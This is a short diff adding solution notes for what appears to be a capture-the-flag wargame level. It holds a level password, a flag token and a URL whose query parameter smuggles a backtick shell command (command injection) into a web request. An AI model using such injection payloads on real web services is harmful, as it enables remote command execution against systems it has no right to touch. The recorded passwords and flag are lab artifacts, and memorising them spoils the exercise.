@@ -1,0 +1,4 @@
+su level04
+password: qi0maab88jeaj46qoumi7maus
+
+http://10.12.100.78:4747/?x=`getflag` => ne2searoevaevoem4ov4ar8ap
